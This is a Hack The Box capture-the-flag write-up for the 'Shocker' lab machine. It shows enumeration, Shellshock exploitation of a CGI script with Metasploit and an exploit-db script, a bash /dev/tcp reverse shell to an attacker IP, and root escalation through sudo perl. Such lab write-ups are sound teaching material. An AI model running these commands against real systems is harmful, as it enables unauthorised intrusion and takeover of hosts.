![logo](/logo.png)

# [Shocker- BOX]  
Hi folks, today I am going to solve an Easy rated hack the box machine which was released on 30 Sep 2017 as the tenth machine on HTB,Shocker created by [mrb3n](https://app.hackthebox.com/users/2984) .So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *cgi
  *shellock
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/shocker 10.10.10.56
```

###### Output 

![](/Linux/Linux-Easy/Shocker/Screenshots/nmap.png)

```sh
nmap -sV -sC -oA nmap/shocker 10.10.10.56                                                                                         ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-28 20:02 EAT
Nmap scan report for 10.10.10.56
Host is up (0.38s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.28 seconds
```

looking at the results  we find out that there are 2 ports open and its a `Ubuntu`and its running an `Apache`. 

port[80]-  http
port[2222]-ssh

So when we go the browser at [http://10.10.10.56](http://10.10.10.56)  looking at the browser we find a page with dont bug me!

![](/Linux/Linux-Easy/Shocker/Screenshots/browser.png)

I start `gobuster` and run it  to enumerate existing directories.

```sh
gobuster dir -u http://10.10.10.56 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -x php -t 50
```



Due to the limited results, and inferring from the name of the Machine, it is fairly safe to assume at
this point that the entry method will be through a script in /cgi-bin/ using the Shellshock exploit.
Fuzzing for the extensions cgi, sh, pl, py get us the following results.

# Exploitation

With the discovered user.sh script, and due to the lack of another attack surface, it is quite clear
at this point that the exploit will be `shellshock` `Apache mod_cgi`. There is a Metasploit module
for this specific vulnerability, as well as a Proof of Concept on exploit-db.

```sh
cat user.sh
```

![](/Linux/Linux-Easy/Shocker/Screenshots/usersh.png)

we starte `msfconsole`

```sh
search apace cgi
```

![](/Linux/Linux-Easy/Shocker/Screenshots/msfconsole.png)

```sh
show options
set RHOSTS 10.10.10.56
set TARGETURI /cgi-bin/user.sh
set LHOST 10.10.14.15
run
```

and just like that we get a meterpreter

![](/Linux/Linux-Easy/Shocker/Screenshots/meterpreter.png)

lets start a pyhon script from [exploitDB](https://exploit-db.com/exploits/34900/) so that we can do this manually 

```sh
python3 shellock.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.15 lport=1337 pages=/cgi-bin/user.sh
```

![](/Linux/Linux-Easy/Shocker/Screenshots/userflag.png)


lets start a shell 

```sh
/bin/bash -i >& /dev/tcp/10.10.14.15/443 0>&1
```

![](/Linux/Linux-Easy/Shocker/Screenshots/shell.png)

then it close but gets us a shell

![](/Linux/Linux-Easy/Shocker/Screenshots/shellpython.png)

`perl` has a `-e` option that allows me to run Perl from the command line. It also has an `exec` command that will run shell commands. Putting that together, I can run `bash` as root

![](/Linux/Linux-Easy/Shocker/Screenshots/sudol.png)

```sh
sudo perl -e 'exec "/bin/bash"'
```

you can get `root` shell

![](/Linux/Linux-Easy/Shocker/Screenshots/shellroot.png)

	-------------------------END successful attack @lesley----------------------


